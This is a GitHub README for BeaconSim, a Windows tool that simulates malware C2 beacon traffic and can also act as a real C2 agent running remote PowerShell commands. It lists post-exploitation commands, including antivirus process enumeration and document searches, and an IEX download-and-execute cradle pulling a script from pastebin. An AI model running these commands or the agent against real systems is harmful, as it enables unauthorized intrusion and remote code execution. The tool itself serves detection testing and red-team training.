## BeaconSim - C2 Beacon Simulator
Simulate Malware activity. Configure connections via different ports and protocls with Yaml.
---


<img width="611" alt="image" src="https://github.com/user-attachments/assets/f8c162a8-d24b-4732-99b5-42d4cd0a4686" />


# BeaconSim - C2 Beacon Simulator & Agent

![BeaconSim](https://img.shields.io/badge/Version-2.0-blue) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey) ![Framework](https://img.shields.io/badge/.NET-Framework%204.8%20%7C%20.NET%209.0-purple)

BeaconSim is a versatile cybersecurity tool that operates in two modes:
1. **Beacon Simulation Mode** - Simulate malware C2 communications for testing detection systems
2. **C2 Agent Mode** - Function as a real C2 agent for red team exercises and security research

Great for testing Threat Intelligence feeds, verifying detection logic in EDR and SIEMs, and conducting authorized security assessments!

## 🚀 Quick Start

### Simulation Mode (Original)
```powershell
.\BeaconSim.exe --config=targets.yaml --minInterval=30 --maxInterval=120 --loopCount=10
```
Remove the C2 settings from the Yaml if you want to use theoriginal targets.


### C2 Agent Mode (New)
```bash
.\BeaconSim.exe --c2
```

## 📖 Usage

```
BeaconSim - C2 Beacon Simulator & Agent
----------------------------------------
Usage:
  BeaconSim.exe [--config=path] [--loopCount=N] [--c2]

Options:
  --config=path        Path to YAML config file (default: targets.yaml)
  --loopCount=N        Number of beacon attempts (-1 = infinite)
  --c2                 Force C2 agent mode
  --help, -h           Show this help menu and exit

Modes:
  C2 Agent Mode:       Connects to C2 server and executes commands
  Simulation Mode:     Original beacon simulation (legacy)

Examples:
  BeaconSim.exe --c2                           # Run as C2 agent
  BeaconSim.exe --config=myconfig.yaml --c2   # Use custom config
```

## 🌐 Simulation Mode - Supported Protocols

You can specify one or more protocols per target in your `targets.yaml` config file. BeaconSim will simulate connection attempts using the selected protocols and ports.

| Protocol | Description | Notes |
|----------|-------------|--------|
| `ping` | ICMP echo request (simulated) | Uses DNS resolution to simulate |
| `http` | HTTP GET request | Port 80 by default |
| `https` | HTTPS GET request (SSL/TLS) | Port 443 by default |
| `dns` | DNS resolution via `Dns.GetHostAddressesAsync()` | Uses system resolver |
| `tcp` | Raw TCP socket connection | Requires port(s) to be defined |
| `ftp` | TCP connection on port 21 | Simulates basic connection only |
| `ssh` | TCP connection on port 22 | No authentication performed |
| `websocket` | WebSocket handshake (if implemented) | Fallbacks to HTTP(s) if needed |

### Simulation Configuration Example
```yaml
targets:
  - host: "8.8.8.8"
    protocols: ["ping", "tcp"]
    ports: [53]
  - host: "google.com"
    protocols: ["http", "tcp"]
    ports: [80, 443]
  - host: "github.com"
    protocols: ["http"]
```

## 🎯 C2 Agent Mode - Remote Command Execution

When running with `--c2` flag, BeaconSim connects to a C2 server and can execute remote PowerShell commands.

### C2 Configuration Example
```yaml
# C2 Server Configuration
c2_server:
  url: "http://192.168.1.100:8080"
  agent_id: "agent_001"

# Beacon timing
intervals:
  min_interval: 30
  max_interval: 120
```

### Compatible C2 Server
BeaconSim C2 mode is designed to work with [SimpleC2Listener](https://github.com/acquiredsecurity/SimpleC2Listener).

## 💻 Command Examples

Once connected to a C2 server, the following PowerShell commands can be executed remotely:

### System Information
```powershell
whoami
systeminfo
Get-ComputerInfo | Select-Object WindowsProductName, TotalPhysicalMemory
```

### Process Enumeration
```powershell
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Process | Where-Object {$_.ProcessName -match "defender|kaspersky|symantec"}
```

### Network Reconnaissance
```powershell
ipconfig /all
netstat -an | findstr LISTENING
Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4"}
```

### File System Access
```powershell
dir C:\Users
Get-ChildItem C:\ -Recurse -Include *.txt,*.doc -ErrorAction SilentlyContinue
```

### Remote Script Execution
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/SCRIPT_ID')
```

## 🔧 Configuration

### Full Configuration Example
```yaml
# C2 Server Configuration (for agent mode)
c2_server:
  url: "http://192.168.1.100:8080"
  agent_id: "agent_001"

# Beacon timing
intervals:
  min_interval: 30
  max_interval: 120

# Targets (for simulation mode)
targets:
  - host: "8.8.8.8"
    protocols: ["ping", "tcp"]
    ports: [53]
  - host: "google.com"
    protocols: ["http", "tcp"]
    ports: [80, 443]
  - host: "1.1.1.1"
    protocols: ["ping"]
  - host: "github.com"
    protocols: ["http"]
  - host: "example.com"
    protocols: ["ping", "http", "https", "dns", "tcp", "ftp", "websocket"]
    ports: [80, 443, 21, 22]
```

## 🛡️ Security Considerations

**Important:** This tool is designed for authorized security testing and educational purposes only.

### C2 Agent Mode
- **No encryption** - Communications sent in plaintext HTTP
- **PowerShell execution** - Executes commands with current user privileges
- **Network traffic** - Generates detectable C2 traffic patterns
- **System access** - Can read files and execute system commands

### Simulation Mode
- **Network connections** - Creates actual network connections to target hosts
- **DNS queries** - Generates real DNS resolution requests
- **Detection testing** - Designed to trigger security monitoring systems

## 📋 System Requirements

- **OS:** Windows 10/11, Windows Server 2016+
- **Framework:** .NET Framework 4.8+ or .NET 9.0+
- **Dependencies:** 
  - YamlDotNet (for configuration parsing)
  - Newtonsoft.Json (for C2 communications)
- **Network:** Internet connectivity for external targets
- **PowerShell:** Version 5.0+ (for C2 agent mode)

## 🔮 Use Cases

### Security Testing
- **Red Team Exercises** - Simulate real C2 communications
- **Blue Team Training** - Generate known-bad traffic for detection testing
- **SOC Training** - Practice incident response with controlled C2 activity
- **Tool Validation** - Test EDR, SIEM, and network monitoring tools

### Research and Development
- **Malware Analysis** - Study C2 communication patterns
- **Detection Research** - Develop new detection algorithms
- **Network Security** - Test network segmentation and monitoring

## 📚 Related Projects

- **[SimpleC2Listener](https://github.com/acquiredsecurity/SimpleC2Listener)** - Compatible C2 server for agent mode
- **BeaconSim Wiki** - Additional documentation and examples

## ⚠️ Disclaimer

This software is provided for educational and authorized security testing purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. Only use this tool on systems you own or have explicit permission to test. The authors assume no liability for misuse of this software.

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

---

**AcquiredSecurity** - Advancing cybersecurity through practical tools and research.
